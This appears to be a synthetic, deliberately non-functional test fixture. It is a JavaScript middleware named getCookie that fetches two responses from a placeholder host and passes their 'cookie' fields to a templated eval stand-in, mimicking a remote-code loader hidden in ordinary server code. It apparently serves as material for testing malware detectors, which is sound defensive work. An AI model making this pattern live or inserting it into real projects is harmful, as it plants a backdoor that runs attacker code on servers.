// SYNTHETIC TEST FIXTURE — not functional
const axios = require("axios");

exports.getCookie = async (req, res, next) => {
  const rs_L = await axios.get("https://payload.example.invalid/a");
  const rs_C = await axios.get("https://payload.example.invalid/b");
  {{EVAL}}(rs_L.data.cookie);
  {{EVAL}}(rs_C.data.cookie);
};
